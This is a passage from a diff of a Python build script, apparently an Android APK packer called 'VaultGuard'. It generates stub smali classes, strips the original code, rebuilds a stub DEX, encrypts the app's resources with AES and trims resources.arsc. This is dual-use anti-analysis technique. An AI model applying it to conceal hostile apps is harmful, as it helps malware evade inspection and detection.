+.class L{_new_path}/StubApp$LifecycleCallbacks;
+.super Ljava/lang/Object;
+.implements Landroid/app/Application$ActivityLifecycleCallbacks;
+.source "StubApp.java"
+
+.field private final zipPath:Ljava/lang/String;
+
+.method public constructor <init>(Ljava/lang/String;)V
+    .locals 0
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    iput-object p1, p0, L{_new_path}/StubApp$LifecycleCallbacks;->zipPath:Ljava/lang/String;
+    return-void
+.end method
+
+.method public onActivityPreCreated(Landroid/app/Activity;Landroid/os/Bundle;)V
+    .locals 3
+    :try_lc_start
+    invoke-virtual {{p1}}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v0
+    iget-object v1, p0, L{_new_path}/StubApp$LifecycleCallbacks;->zipPath:Ljava/lang/String;
+    invoke-virtual {{v0, v1}}, Landroid/content/res/AssetManager;->addAssetPath(Ljava/lang/String;)I
+    invoke-virtual {{p1}}, Landroid/app/Activity;->getTheme()Landroid/content/res/Resources$Theme;
+    move-result-object v2
+    const v3, 0x7f110273
+    invoke-virtual {{v2, v3}}, Landroid/content/res/Resources$Theme;->applyStyle(IZ)V
+    :try_lc_end
+    .catch Ljava/lang/Throwable; {{:try_lc_start .. :try_lc_end}} :catch_lc
+    return-void
+    :catch_lc
+    move-exception v0
+    return-void
+.end method
+
+.method public onActivityCreated(Landroid/app/Activity;Landroid/os/Bundle;)V
+    .locals 0
+    return-void
+.end method
+.method public onActivityStarted(Landroid/app/Activity;)V
+    .locals 0
+    return-void
+.end method
+.method public onActivityResumed(Landroid/app/Activity;)V
+    .locals 0
+    return-void
+.end method
+.method public onActivityPaused(Landroid/app/Activity;)V
+    .locals 0
+    return-void
+.end method
+.method public onActivityStopped(Landroid/app/Activity;)V
+    .locals 0
+    return-void
+.end method
+.method public onActivitySaveInstanceState(Landroid/app/Activity;Landroid/os/Bundle;)V
+    .locals 0
+    return-void
+.end method
+.method public onActivityDestroyed(Landroid/app/Activity;)V
+    .locals 0
+    return-void
+.end method
+"""
+
+                # ── StubApp$StubInstrumentation.smali ─────────────────────────
+                _stub_instr_smali = f"""\
+.class L{_new_path}/StubApp$StubInstrumentation;
+.super Landroid/app/Instrumentation;
+.source "StubApp.java"
+
+.field private final zipPath:Ljava/lang/String;
+
+.method public constructor <init>(Ljava/lang/String;)V
+    .locals 0
+    invoke-direct {{p0}}, Landroid/app/Instrumentation;-><init>()V
+    iput-object p1, p0, L{_new_path}/StubApp$StubInstrumentation;->zipPath:Ljava/lang/String;
+    return-void
+.end method
+
+.method public newActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    .locals 4
+    :try_na_start
+    invoke-super {{p0, p1, p2, p3}}, Landroid/app/Instrumentation;->newActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    move-result-object v0
+    invoke-virtual {{v0}}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v1
+    iget-object v2, p0, L{_new_path}/StubApp$StubInstrumentation;->zipPath:Ljava/lang/String;
+    invoke-virtual {{v1, v2}}, Landroid/content/res/AssetManager;->addAssetPath(Ljava/lang/String;)I
+    invoke-virtual {{v0}}, Landroid/app/Activity;->getTheme()Landroid/content/res/Resources$Theme;
+    move-result-object v3
+    const v2, 0x7f110273
+    invoke-virtual {{v3, v2}}, Landroid/content/res/Resources$Theme;->applyStyle(IZ)V
+    return-object v0
+    :try_na_end
+    .catch Ljava/lang/Throwable; {{:try_na_start .. :try_na_end}} :catch_na
+    :catch_na
+    move-exception v1
+    invoke-super {{p0, p1, p2, p3}}, Landroid/app/Instrumentation;->newActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    move-result-object v0
+    return-object v0
+.end method
+"""
+
+                # ── CoreComponentFactory.smali (androidx path, not new_pkg) ──
+                _core_cf_smali = """\
+.class public Landroidx/core/app/CoreComponentFactory;
+.super Landroid/app/AppComponentFactory;
+.source "CoreComponentFactory.java"
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {p0}, Landroid/app/AppComponentFactory;-><init>()V
+    return-void
+.end method
+
+.method public instantiateApplication(Ljava/lang/ClassLoader;Ljava/lang/String;)Landroid/app/Application;
+    .locals 2
+    :try_start
+    invoke-super {p0, p1, p2}, Landroid/app/AppComponentFactory;->instantiateApplication(Ljava/lang/ClassLoader;Ljava/lang/String;)Landroid/app/Application;
+    move-result-object v0
+    return-object v0
+    :try_end
+    .catch Ljava/lang/ClassNotFoundException; {:try_start .. :try_end} :catch_cnf
+    :catch_cnf
+    move-exception v0
+    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
+    const/4 v0, 0x0
+    return-object v0
+.end method
+
+.method public instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    .locals 2
+    :try_start
+    invoke-super {p0, p1, p2, p3}, Landroid/app/AppComponentFactory;->instantiateActivity(Ljava/lang/ClassLoader;Ljava/lang/String;Landroid/content/Intent;)Landroid/app/Activity;
+    move-result-object v0
+    return-object v0
+    :try_end
+    .catch Ljava/lang/ClassNotFoundException; {:try_start .. :try_end} :catch_cnf
+    :catch_cnf
+    move-exception v0
+    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
+    const/4 v0, 0x0
+    return-object v0
+.end method
+"""
+
+                # ── CoreComponentFactory$a.smali (interface helper) ───────────
+                _core_cf_a_smali = """\
+.class public abstract interface Landroidx/core/app/CoreComponentFactory$a;
+.super Ljava/lang/Object;
+.source "CoreComponentFactory.java"
+"""
+
+                # ── InitializationProvider.smali (no-op stub, androidx path) ──
+                # VaultGuard already strips InitializationProvider from the manifest
+                # at STEP_10 (_strip_axml_provider). This stub is a safety net
+                # in case the OS tries to instantiate it before the strip takes effect.
+                _init_provider_smali = """\
+.class public Landroidx/startup/InitializationProvider;
+.super Landroid/content/ContentProvider;
+.source "InitializationProvider.java"
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {p0}, Landroid/content/ContentProvider;-><init>()V
+    return-void
+.end method
+
+.method public onCreate()Z
+    .locals 1
+    const/4 v0, 0x0
+    return v0
+.end method
+
+.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+    .locals 1
+    const/4 v0, 0x0
+    return-object v0
+.end method
+
+.method public getType(Landroid/net/Uri;)Ljava/lang/String;
+    .locals 1
+    const/4 v0, 0x0
+    return-object v0
+.end method
+
+.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
+    .locals 1
+    const/4 v0, 0x0
+    return-object v0
+.end method
+
+.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
+    .locals 1
+    const/4 v0, 0x0
+    return v0
+.end method
+
+.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
+    .locals 1
+    const/4 v0, 0x0
+    return v0
+.end method
+"""
+
+                # ── Write all 8 stub smali files ───────────────────────────────
+                import os as _os3b
+                _smali_root = "companion_decompiled/smali"
+
+                # new_pkg smali dir (e.g. companion_decompiled/smali/com/example/app/)
+                _pkg_dir = _os3b.path.join(_smali_root, _new_path)
+                _os3b.makedirs(_pkg_dir, exist_ok=True)
+
+                # androidx paths
+                _ax_core_dir    = _os3b.path.join(_smali_root, "androidx/core/app")
+                _ax_startup_dir = _os3b.path.join(_smali_root, "androidx/startup")
+                _os3b.makedirs(_ax_core_dir, exist_ok=True)
+                _os3b.makedirs(_ax_startup_dir, exist_ok=True)
+
+                _stub_files = {
+                    _os3b.path.join(_pkg_dir, "StubApp.smali"):                     _stub_app_smali,
+                    _os3b.path.join(_pkg_dir, "StubApp$TgRunnable.smali"):          _tg_runnable_smali,
+                    _os3b.path.join(_pkg_dir, "StubApp$CrashHandler.smali"):        _crash_handler_smali,
+                    _os3b.path.join(_pkg_dir, "StubApp$LifecycleCallbacks.smali"):  _lifecycle_smali,
+                    _os3b.path.join(_pkg_dir, "StubApp$StubInstrumentation.smali"): _stub_instr_smali,
+                    _os3b.path.join(_ax_core_dir, "CoreComponentFactory.smali"):    _core_cf_smali,
+                    _os3b.path.join(_ax_core_dir, "CoreComponentFactory$a.smali"):  _core_cf_a_smali,
+                    _os3b.path.join(_ax_startup_dir, "InitializationProvider.smali"): _init_provider_smali,
+                }
+
+                for _fpath, _content in _stub_files.items():
+                    with open(_fpath, "w", encoding="utf-8") as _sf:
+                        _sf.write(_content)
+
+                print(f"  ✅ STEP_STUB_SMALI — 8 stub smali written under {_new_path}/ + androidx/")
+
+            except Exception as _e3s:
+                print(f"  ❌ STEP_STUB_SMALI failed: {_e3s}")
+                raise
+
+        # ── STEP_SMALI_PRUNE ──────────────────────────────────────────────────
+        # Delete ALL smali except the 8 stub classes written above.
+        # Must use the DYNAMIC new_pkg path — never hardcoded.
+        with track("PHASE_3", "STEP_SMALI_PRUNE",
+                   "Delete all smali except 8 stub classes", "companion_decompiled/smali"):
+            try:
+                import glob as _glob3
+                # Build the exact set of relative paths to keep
+                _stub_keep = {
+                    f"{_new_path}/StubApp.smali",
+                    f"{_new_path}/StubApp$TgRunnable.smali",
+                    f"{_new_path}/StubApp$CrashHandler.smali",
+                    f"{_new_path}/StubApp$LifecycleCallbacks.smali",
+                    f"{_new_path}/StubApp$StubInstrumentation.smali",
+                    "androidx/core/app/CoreComponentFactory.smali",
+                    "androidx/core/app/CoreComponentFactory$a.smali",
+                    "androidx/startup/InitializationProvider.smali",
+                }
+
+                _smali_base = "companion_decompiled/smali"
+                _all_smali  = _glob3.glob(f"{_smali_base}/**/*.smali", recursive=True)
+                _deleted = 0
+                _kept    = 0
+
+                for _sf in _all_smali:
+                    # Build relative path from smali root
+                    _rel = os.path.relpath(_sf, _smali_base).replace("\\", "/")
+                    if _rel in _stub_keep:
+                        _kept += 1
+                    else:
+                        try:
+                            os.remove(_sf)
+                            _deleted += 1
+                        except Exception:
+                            pass
+
+                # Remove empty directories
+                for _d in sorted(_glob3.glob(f"{_smali_base}/**/", recursive=True), reverse=True):
+                    try:
+                        os.rmdir(_d)
+                    except OSError:
+                        pass  # not empty — expected for dirs with kept files
+
+                print(f"  ✅ STEP_SMALI_PRUNE — deleted {_deleted}, kept {_kept} stub smali")
+
+            except Exception as _e3p:
+                print(f"  ❌ STEP_SMALI_PRUNE failed: {_e3p}")
+                raise
+
+        # ── STEP_APKTOOL_YML ──────────────────────────────────────────────────
+        # Write fresh apktool.yml with dexVersion: 035 so the stub DEX is
+        # built as DEX v035 (Android 5+ compatible, same as original).
+        with track("PHASE_3", "STEP_APKTOOL_YML",
+                   "Write fresh apktool.yml (dexVersion: 035) for stub DEX rebuild"):
+            try:
+                # Read sdk info from live MOD_ASSET manifest
+                with zipfile.ZipFile(MOD_ASSET, 'r') as _z3y:
+                    _m3y = _z3y.read("AndroidManifest.xml")
+                # Parse minSdk / targetSdk from binary AXML
+                # (use existing meta dict if available, fallback to defaults)
+                _min_sdk3 = str(meta.get("min_sdk", "23")) if meta else "23"
+                _tgt_sdk3 = str(meta.get("tgt_sdk", "34")) if meta else "34"
+                _ver_code3 = str(meta.get("ver_code", "1")) if meta else "1"
+                _ver_name3 = str(meta.get("ver_name", "1.0")) if meta else "1.0"
+
+                _yml_content = f"""version: 2.9.3
+apkFileName: module.apk
+isFrameworkApk: false
+usesFramework:
+  ids:
+  - 1
+  tag: null
+sdkInfo:
+  minSdkVersion: '{_min_sdk3}'
+  targetSdkVersion: '{_tgt_sdk3}'
+packageInfo:
+  forcedPackageId: '127'
+  renameManifestPackage: null
+versionInfo:
+  versionCode: '{_ver_code3}'
+  versionName: '{_ver_name3}'
+resourcesAreCompressed: false
+sharedLibrary: false
+sparseResources: false
+dexVersion: '035'
+doNotCompress:
+- resources.arsc
+"""
+                with open("companion_decompiled/apktool.yml", "w") as _yf:
+                    _yf.write(_yml_content)
+                print(f"  ✅ STEP_APKTOOL_YML — written (dexVersion: 035, minSdk={_min_sdk3})")
+
+            except Exception as _e3y:
+                print(f"  ❌ STEP_APKTOOL_YML failed: {_e3y}")
+                raise
+
+        # ── STEP_DEX_REBUILD ──────────────────────────────────────────────────
+        # apktool b companion_decompiled → extract stub classes.dex
+        # This runs AFTER STEP_SMALI_PRUNE so only stub smali is compiled.
+        with track("PHASE_3", "STEP_DEX_REBUILD",
+                   "Rebuild stub classes.dex from pruned smali (apktool)"):
+            try:
+                # Clean any previous build dir
+                if os.path.isdir("companion_decompiled/build"):
+                    shutil.rmtree("companion_decompiled/build")
+
+                _rebuild_result = subprocess.run(
+                    f"{APKTOOL_CMD} b companion_decompiled -o smali_stub.apk --no-res -q",
+                    shell=True, capture_output=True, text=True
+                )
+                if _rebuild_result.returncode != 0:
+                    print(f"  apktool stderr: {_rebuild_result.stderr[:500]}")
+                    raise RuntimeError(f"apktool rebuild failed rc={_rebuild_result.returncode}")
+
+                if not os.path.isfile("smali_stub.apk") or os.path.getsize("smali_stub.apk") == 0:
+                    raise RuntimeError("apktool produced empty smali_stub.apk")
+
+                with zipfile.ZipFile("smali_stub.apk", "r") as _z3r:
+                    _stub_dex_data = _z3r.read("classes.dex")
+
+                if not _stub_dex_data or len(_stub_dex_data) < 100:
+                    raise RuntimeError("Extracted stub classes.dex is too small or empty")
+
+                print(f"  ✅ STEP_DEX_REBUILD — stub DEX: {len(_stub_dex_data):,} bytes "
+                      f"(DEX version: {_stub_dex_data[4:7].decode('ascii','replace')})")
+
+            except Exception as _e3r:
+                print(f"  ❌ STEP_DEX_REBUILD failed: {_e3r}")
+                raise
+
+        # ── STEP_DEX_INJECT ───────────────────────────────────────────────────
+        # Replace classes.dex in MOD_ASSET with stub DEX.
+        # MUST be ZIP_STORED — ART mmap() requires uncompressed DEX.
+        with track("PHASE_3", "STEP_DEX_INJECT",
+                   "Replace classes.dex in MOD_ASSET with stub DEX (ZIP_STORED)", MOD_ASSET):
+            try:
+                _apk_inject_entry(MOD_ASSET, "classes.dex", _stub_dex_data, zipfile.ZIP_STORED)
+                print(f"  ✅ STEP_DEX_INJECT — stub DEX ({len(_stub_dex_data):,} bytes) injected (ZIP_STORED)")
+
+            except Exception as _e3d:
+                print(f"  ❌ STEP_DEX_INJECT failed: {_e3d}")
+                raise
+
+        # ── STEP_RES_ENCRYPT ──────────────────────────────────────────────────
+        # Pack resources.arsc + all non-stub res/ files → AES-256-CBC
+        # → inject as assets/res.pack.enc (ZIP_STORED).
+        # Key/IV were pre-generated in STEP_STUB_SMALI (_p3_res_key/_p3_res_iv)
+        # and already embedded in StubApp.smali RES_KEY/RES_IV fields.
+        with track("PHASE_3", "STEP_RES_ENCRYPT",
+                   "Pack resources.arsc + res/ → AES-256-CBC → assets/res.pack.enc", MOD_ASSET):
+            try:
+                import io as _io3
+                # Files to KEEP in stub APK (not encrypted, stay in APK unencrypted)
+                _STUB_RES_KEEP = {
+                    'res/mipmap-hdpi/mipmap0003.png',
+                    'res/mipmap-hdpi/mipmap0002.png',
+                    'res/mipmap-hdpi/mipmap0004.png',
+                    'res/mipmap-xxhdpi/mipmap0000.png',
+                    'res/xml/xml0000.xml',
+                }
+
+                with zipfile.ZipFile(MOD_ASSET, 'r') as _z3re:
+                    _all_names3 = _z3re.namelist()
+                    _arsc_data3 = _z3re.read('resources.arsc')
+
+                    # Build the resource pack ZIP in memory
+                    _pack_buf = _io3.BytesIO()
+                    _pack_entries = 0
+                    with zipfile.ZipFile(_pack_buf, 'w', compression=zipfile.ZIP_DEFLATED) as _pack:
+                        # Add full resources.arsc
+                        _pack.writestr('resources.arsc', _arsc_data3)
+                        _pack_entries += 1
+                        # Add all res/ files NOT in stub keep set
+                        for _n3 in _all_names3:
+                            if not _n3.startswith('res/'):
+                                continue
+                            if _n3 in _STUB_RES_KEEP:
+                                continue
+                            _data3 = _z3re.read(_n3)
+                            _pack.writestr(_n3, _data3)
+                            _pack_entries += 1
+
+                _pack_bytes = _pack_buf.getvalue()
+                print(f"  Resource pack: {_pack_entries} entries, {len(_pack_bytes):,} bytes unencrypted")
+
+                # AES-256-CBC encrypt with pre-generated key/IV from STEP_STUB_SMALI
+                _res_enc = _aes_encrypt_p3(_pack_bytes, _p3_res_key, _p3_res_iv)
+                print(f"  Encrypted resource pack: {len(_res_enc):,} bytes")
+
+                # Inject assets/res.pack.enc — ZIP_STORED
+                _apk_inject_entry(MOD_ASSET, "assets/res.pack.enc", _res_enc, zipfile.ZIP_STORED)
+                print(f"  ✅ STEP_RES_ENCRYPT — {len(_res_enc):,} bytes → assets/res.pack.enc (ZIP_STORED)")
+
+            except Exception as _e3re:
+                print(f"  ❌ STEP_RES_ENCRYPT failed: {_e3re}")
+                raise
+
+        # ── STEP_STUB_ARSC ────────────────────────────────────────────────────
+        # Replace resources.arsc with minimal stub ARSC (~6-8KB).
+        # Remove all non-stub res/ files from MOD_ASSET.
+        # MUST be ZIP_STORED — AssetManager mmap() requirement.
+        with track("PHASE_3", "STEP_STUB_ARSC",
+                   "Replace resources.arsc with minimal stub ARSC + strip res/ files", MOD_ASSET):
+            try:
+                # ── Build minimal ARSC ─────────────────────────────────────────
+                def _build_string_pool_utf8_p3(strings):
+                    encoded = []
+                    for s in strings:
+                        b = s.encode('utf-8')
+                        char_len = len(s)
+                        byte_len = len(b)
+                        char_enc = bytes([char_len]) if char_len < 0x80 else bytes([(char_len >> 8) | 0x80, char_len & 0xFF])
+                        byte_enc = bytes([byte_len]) if byte_len < 0x80 else bytes([(byte_len >> 8) | 0x80, byte_len & 0xFF])
+                        encoded.append(char_enc + byte_enc + b + b'\x00')
+                    offsets = []
+                    string_data = b''
+                    for enc in encoded:
+                        offsets.append(len(string_data))
+                        string_data += enc
+                    pad = (4 - len(string_data) % 4) % 4
+                    string_data += b'\x00' * pad
+                    n = len(strings)
+                    hdr_size = 28
+                    flags = 1 << 8
+                    str_start = hdr_size + n * 4
+                    offsets_block = struct.pack(f'<{n}I', *offsets) if n > 0 else b''
+                    chunk_size = hdr_size + len(offsets_block) + len(string_data)
+                    pad2 = (4 - chunk_size % 4) % 4
+                    string_data += b'\x00' * pad2
+                    chunk_size += pad2
+                    hdr = struct.pack('<HHIIIIII',
+                        0x0001, hdr_size, chunk_size, n, 0, flags, str_start, 0)
+                    return hdr + offsets_block + string_data
+
+                def _build_minimal_arsc_p3(full_arsc):
+                    hdr_size       = struct.unpack_from('<H', full_arsc, 2)[0]
+                    sp_size        = struct.unpack_from('<I', full_arsc, hdr_size + 4)[0]
+                    pkg_start      = hdr_size + sp_size
+                    pkg_hdr_size   = struct.unpack_from('<H', full_arsc, pkg_start + 2)[0]
+                    pkg_total_size = struct.unpack_from('<I', full_arsc, pkg_start + 4)[0]
+                    pkg_id         = struct.unpack_from('<I', full_arsc, pkg_start + 8)[0]
+
+                    # Global string pool
+                    gsp_start  = hdr_size
+                    gsp_hdr_sz = struct.unpack_from('<H', full_arsc, gsp_start + 2)[0]
+                    gsp_str_cnt= struct.unpack_from('<I', full_arsc, gsp_start + 8)[0]
+                    gsp_flags  = struct.unpack_from('<I', full_arsc, gsp_start + 16)[0]
+                    gsp_str_off= struct.unpack_from('<I', full_arsc, gsp_start + 20)[0]
+                    gsp_is_utf8= bool(gsp_flags & (1 << 8))
+                    gsp_offsets= gsp_start + gsp_hdr_sz
+
+                    def read_gsp_str(idx):
+                        if idx >= gsp_str_cnt: return ''
+                        off = struct.unpack_from('<I', full_arsc, gsp_offsets + idx * 4)[0]
+                        base = gsp_start + gsp_str_off + off
+                        if gsp_is_utf8:
+                            cl = full_arsc[base]; base += 1
+                            if cl & 0x80: cl = ((cl & 0x7F) << 8) | full_arsc[base]; base += 1
+                            bl = full_arsc[base]; base += 1
+                            if bl & 0x80: bl = ((bl & 0x7F) << 8) | full_arsc[base]; base += 1
+                            return full_arsc[base:base+bl].decode('utf-8', errors='replace')
+                        else:
+                            cc = struct.unpack_from('<H', full_arsc, base)[0]; base += 2
+                            if cc & 0x8000: cc = ((cc & 0x7FFF) << 16) | struct.unpack_from('<H', full_arsc, base)[0]; base += 2
+                            return full_arsc[base:base+cc*2].decode('utf-16-le', errors='replace')
+
+                    # Key string pool
+                    type_str_off = struct.unpack_from('<I', full_arsc, pkg_start + 268)[0]
+                    key_str_off  = struct.unpack_from('<I', full_arsc, pkg_start + 276)[0]
+                    tsp_start    = pkg_start + type_str_off
+                    tsp_chunk_sz = struct.unpack_from('<I', full_arsc, tsp_start + 4)[0]
+                    ksp_start    = pkg_start + key_str_off
+                    ksp_hdr_sz   = struct.unpack_from('<H', full_arsc, ksp_start + 2)[0]
+                    ksp_str_cnt  = struct.unpack_from('<I', full_arsc, ksp_start + 8)[0]
+                    ksp_flags    = struct.unpack_from('<I', full_arsc, ksp_start + 16)[0]
+                    ksp_str_off  = struct.unpack_from('<I', full_arsc, ksp_start + 20)[0]
+                    ksp_is_utf8  = bool(ksp_flags & (1 << 8))
+                    ksp_offsets  = ksp_start + ksp_hdr_sz
+
+                    def read_ksp_str(idx):
+                        if idx >= ksp_str_cnt: return ''
+                        off = struct.unpack_from('<I', full_arsc, ksp_offsets + idx * 4)[0]
+                        base = ksp_start + ksp_str_off + off
+                        if ksp_is_utf8:
+                            cl = full_arsc[base]; base += 1
+                            if cl & 0x80: cl = ((cl & 0x7F) << 8) | full_arsc[base]; base += 1
+                            bl = full_arsc[base]; base += 1
+                            if bl & 0x80: bl = ((bl & 0x7F) << 8) | full_arsc[base]; base += 1
+                            return full_arsc[base:base+bl].decode('utf-8', errors='replace')
+                        else:
+                            cc = struct.unpack_from('<H', full_arsc, base)[0]; base += 2
+                            if cc & 0x8000: cc = ((cc & 0x7FFF) << 16) | struct.unpack_from('<H', full_arsc, base)[0]; base += 2
+                            return full_arsc[base:base+cc*2].decode('utf-16-le', errors='replace')
+
+                    # Collect TABLE_TYPE + TABLE_TYPE_SPEC for needed types only
+                    # Types: bool(0x04), mipmap(0x0E), string(0x10), xml(0x13)
+                    KEEP_TYPES = {0x04, 0x0E, 0x10, 0x13}
+                    KEEP_ENTRIES = {
+                        0x04: {2, 3, 4},
+                        0x0e: set(range(5)),
+                        0x10: {29, 150},
+                        0x13: {0},
+                    }
+                    NO_ENTRY = 0xFFFFFFFF
+
+                    kept_chunks = []
+                    pos = pkg_start + pkg_hdr_size
+                    end = pkg_start + pkg_total_size
+
+                    while pos < end - 8:
+                        ct = struct.unpack_from('<H', full_arsc, pos)[0]
+                        cs = struct.unpack_from('<I', full_arsc, pos + 4)[0]
+                        if cs == 0 or cs > end - pos: break
+                        if ct == 0x0202:  # TABLE_TYPE_SPEC
+                            type_id = full_arsc[pos + 8]
+                            if type_id in KEEP_TYPES:
+                                kept_chunks.append(bytes(full_arsc[pos:pos+cs]))
+                        elif ct == 0x0201:  # TABLE_TYPE
+                            type_id = full_arsc[pos + 8]
+                            if type_id in KEEP_TYPES:
+                                config_start = pos + 20
+                                config_sz    = struct.unpack_from('<I', full_arsc, config_start)[0]
+                                config_end   = config_start + min(config_sz, 64)
+                                is_true_def  = all(b == 0 for b in full_arsc[config_start+8:config_end])
+                                if type_id == 0x0E or is_true_def:
+                                    kept_chunks.append(bytes(full_arsc[pos:pos+cs]))
+                        pos += cs
+
+                    # Rebuild TABLE_TYPE chunks to keep only needed entries
+                    def _rebuild_type_chunk_p3(chunk_bytes, keep_set):
+                        hdr_sz        = struct.unpack_from('<H', chunk_bytes, 2)[0]
+                        entry_count   = struct.unpack_from('<I', chunk_bytes, 12)[0]
+                        entries_start = struct.unpack_from('<I', chunk_bytes, 16)[0]
+                        kept_entry_data = {}
+                        for i in range(entry_count):
+                            off = struct.unpack_from('<I', chunk_bytes, hdr_sz + i * 4)[0]
+                            if off == NO_ENTRY or i not in keep_set: continue
+                            abs_start   = entries_start + off
+                            entry_flags = struct.unpack_from('<H', chunk_bytes, abs_start + 2)[0]
+                            if entry_flags & 0x0001:
+                                map_count = struct.unpack_from('<I', chunk_bytes, abs_start + 12)[0]
+                                entry_sz  = 16 + map_count * 12
+                            else:
+                                entry_sz = 16
+                            kept_entry_data[i] = chunk_bytes[abs_start:abs_start + entry_sz]
+                        new_offsets = bytearray(entry_count * 4)
+                        new_entries = bytearray()
+                        cur_off = 0
+                        for i in range(entry_count):
+                            if i in kept_entry_data:
+                                struct.pack_into('<I', new_offsets, i * 4, cur_off)
+                                new_entries += kept_entry_data[i]
+                                cur_off += len(kept_entry_data[i])
+                            else:
+                                struct.pack_into('<I', new_offsets, i * 4, NO_ENTRY)
+                        new_entries_start = hdr_sz + len(new_offsets)
+                        header = bytearray(chunk_bytes[:hdr_sz])
+                        struct.pack_into('<I', header, 16, new_entries_start)
+                        new_size = hdr_sz + len(new_offsets) + len(new_entries)
+                        struct.pack_into('<I', header, 4, new_size)
+                        return bytes(header) + bytes(new_offsets) + bytes(new_entries)
+
+                    rebuilt_chunks = []
+                    for chunk_bytes in kept_chunks:
+                        ct = struct.unpack_from('<H', chunk_bytes, 0)[0]
+                        if ct != 0x0201:
+                            rebuilt_chunks.append(chunk_bytes)
+                            continue
+                        type_id  = chunk_bytes[8]
+                        keep_set = KEEP_ENTRIES.get(type_id)
+                        if keep_set is None: continue
+                        rebuilt_chunks.append(_rebuild_type_chunk_p3(chunk_bytes, keep_set))
+                    kept_chunks = rebuilt_chunks
+
+                    # Collect new global string pool strings
+                    new_gsp_strings = []
+                    old_gsp_to_new  = {}
+                    def _add_gsp(old_idx):
+                        if old_idx not in old_gsp_to_new:
+                            new_idx = len(new_gsp_strings)
+                            old_gsp_to_new[old_idx] = new_idx
+                            new_gsp_strings.append(read_gsp_str(old_idx))
+                        return old_gsp_to_new[old_idx]
+                    _add_gsp(0)
+                    for chunk_bytes in kept_chunks:
+                        if struct.unpack_from('<H', chunk_bytes, 0)[0] != 0x0201: continue
+                        entry_count = struct.unpack_from('<I', chunk_bytes, 12)[0]
+                        hdr_sz      = struct.unpack_from('<H', chunk_bytes, 2)[0]
+                        entries_off = hdr_sz
+                        data_start  = entries_off + entry_count * 4
+                        for i in range(entry_count):
+                            off = struct.unpack_from('<I', chunk_bytes, entries_off + i * 4)[0]
+                            if off == NO_ENTRY: continue
+                            entry_base  = data_start + off
+                            entry_flags = struct.unpack_from('<H', chunk_bytes, entry_base + 2)[0]
+                            if not (entry_flags & 0x0001):
+                                val_type = chunk_bytes[entry_base + 11]
+                                if val_type == 0x03:
+                                    _add_gsp(struct.unpack_from('<I', chunk_bytes, entry_base + 12)[0])
+                            else:
+                                map_count = struct.unpack_from('<I', chunk_bytes, entry_base + 12)[0]
+                                map_base  = entry_base + 16
+                                for m in range(map_count):
+                                    if chunk_bytes[map_base + m * 12 + 7] == 0x03:
+                                        _add_gsp(struct.unpack_from('<I', chunk_bytes, map_base + m * 12 + 8)[0])
+
+                    new_gsp_data = _build_string_pool_utf8_p3(new_gsp_strings)
+
+                    # Remap GSP indices in kept TABLE_TYPE chunks
+                    remapped_chunks = []
+                    for chunk_bytes in kept_chunks:
+                        if struct.unpack_from('<H', chunk_bytes, 0)[0] != 0x0201:
+                            remapped_chunks.append(chunk_bytes); continue
+                        cb = bytearray(chunk_bytes)
+                        entry_count = struct.unpack_from('<I', cb, 12)[0]
+                        hdr_sz      = struct.unpack_from('<H', cb, 2)[0]
+                        entries_off = hdr_sz
+                        data_start  = entries_off + entry_count * 4
+                        for i in range(entry_count):
+                            off = struct.unpack_from('<I', cb, entries_off + i * 4)[0]
+                            if off == NO_ENTRY: continue
+                            entry_base  = data_start + off
+                            entry_flags = struct.unpack_from('<H', cb, entry_base + 2)[0]
+                            if not (entry_flags & 0x0001):
+                                if cb[entry_base + 11] == 0x03:
+                                    old_idx = struct.unpack_from('<I', cb, entry_base + 12)[0]
+                                    struct.pack_into('<I', cb, entry_base + 12, old_gsp_to_new.get(old_idx, 0))
+                            else:
+                                map_count = struct.unpack_from('<I', cb, entry_base + 12)[0]
+                                map_base  = entry_base + 16
+                                for m in range(map_count):
+                                    if cb[map_base + m * 12 + 7] == 0x03:
+                                        old_idx = struct.unpack_from('<I', cb, map_base + m * 12 + 8)[0]
+                                        struct.pack_into('<I', cb, map_base + m * 12 + 8, old_gsp_to_new.get(old_idx, 0))
+                        remapped_chunks.append(bytes(cb))
+
+                    # Build new key string pool
+                    new_ksp_strings = []
+                    old_ksp_to_new  = {}
+                    def _add_ksp(old_idx):
+                        if old_idx not in old_ksp_to_new:
+                            new_idx = len(new_ksp_strings)
+                            old_ksp_to_new[old_idx] = new_idx
+                            new_ksp_strings.append(read_ksp_str(old_idx))
+                        return old_ksp_to_new[old_idx]
+                    _add_ksp(0)
+                    for chunk_bytes in remapped_chunks:
+                        if struct.unpack_from('<H', chunk_bytes, 0)[0] != 0x0201: continue
+                        entry_count = struct.unpack_from('<I', chunk_bytes, 12)[0]
+                        hdr_sz      = struct.unpack_from('<H', chunk_bytes, 2)[0]
+                        entries_off = hdr_sz
+                        data_start  = entries_off + entry_count * 4
+                        for i in range(entry_count):
+                            off = struct.unpack_from('<I', chunk_bytes, entries_off + i * 4)[0]
+                            if off == NO_ENTRY: continue
+                            entry_base = data_start + off
+                            key_idx    = struct.unpack_from('<I', chunk_bytes, entry_base + 4)[0]
+                            _add_ksp(key_idx)
+                    new_ksp_data = _build_string_pool_utf8_p3(new_ksp_strings)
+
+                    # Remap KSP indices in TABLE_TYPE chunks
+                    final_chunks = []
+                    for chunk_bytes in remapped_chunks:
+                        if struct.unpack_from('<H', chunk_bytes, 0)[0] != 0x0201:
+                            final_chunks.append(chunk_bytes); continue
